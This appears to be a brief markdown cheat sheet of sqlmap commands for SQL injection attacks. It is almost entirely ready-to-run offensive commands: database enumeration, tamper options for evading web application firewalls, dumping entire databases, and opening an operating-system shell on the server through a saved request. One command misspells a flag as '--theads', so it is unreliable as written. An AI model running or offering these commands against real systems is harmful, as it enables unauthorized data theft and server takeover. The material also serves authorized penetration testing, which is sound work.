# SQLMAP

SQLMAP is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester :)

## Basic Usage

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --batch
```

## Multiple Threads

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --batch --threads 10
```

## Random User-Agent

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --batch --threads 10 --random-agent
```

### WAF Bypass

```
sqlmap -u "https://example.com/page.php?id=1" --dbs --batch --theads 10 --tamper="apostrophemask,apostrophenullencode,randomcase"
```

## Targeting Parameters

```bash
sqlmap -u "http://192.168.50.19/blindsqli.php?user=1" -p user
```

## Dumping Database

```bash
sqlmap -u "http://192.168.50.19/blindsqli.php?user=1" -p user --dump
```

## OS Shell via Burp Suite

```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```
